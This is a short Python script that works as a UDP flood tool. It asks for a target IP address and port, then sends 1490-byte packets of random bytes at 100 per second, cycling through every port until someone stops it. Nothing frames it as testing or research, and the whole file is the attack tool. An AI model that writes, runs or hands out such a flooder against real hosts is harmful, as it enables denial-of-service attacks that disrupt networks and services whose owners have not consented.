import socket
import secrets
import time
from datetime import datetime
import ipaddress

# Get current time (optional)
def get_current_time():
    now = datetime.now()
    return now.hour, now.minute, now.day, now.month, now.year

# Create a UDP socket (IPv4 or IPv6)
def create_socket(is_ipv6=False):
    family = socket.AF_INET6 if is_ipv6 else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    return sock

# Get valid IP address and determine version
def get_target_ip():
    while True:
        ip = input("Enter target IP address (I or M): ").strip()
        try:
            ip_obj = ipaddress.ip_address(ip)
            return ip, ip_obj.version == 6  # Returns (IP, is_ipv6)
        except ValueError:
            print("Invalid IP address format. Please try again.")

# Get valid port number
def get_target_port():
    while True:
        try:
            port = int(input("Enter target port number: "))
            if 0 <= port <= 65535:
                return port
            else:
                print("Port must be between 0 and 65535.")
        except ValueError:
            print("Invalid input. Please enter a number.")

# Main function to send packets
def send_packets(ip, port, rate_limit, is_ipv6=False):
    sock = create_socket(is_ipv6)
    sent = 0
    try:
        while True:
            data = secrets.token_bytes(1490)  # Generate random bytes
            sock.sendto(data, (ip, port))  # Send data to the target IP and port
            sent += 1
            port = (port + 1) % 65536  # Increment port number and wrap around
            print(f"Sent {sent} packet to {ip} on port {port}")
            time.sleep(1 / rate_limit)  # Rate limiting
    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("Packet sending stopped by user.")
    finally:
        sock.close()

if __name__ == "__main__":
    get_current_time()  # Optional: Get current time

    # User input
    target_ip, is_ipv6 = get_target_ip()  # Get target IP and determine if it's IPv6
    target_port = get_target_port()  # Get target port
    rate_limit = 100  # packets per second

    # Start sending packets
    send_packets(target_ip, target_port, rate_limit, is_ipv6)
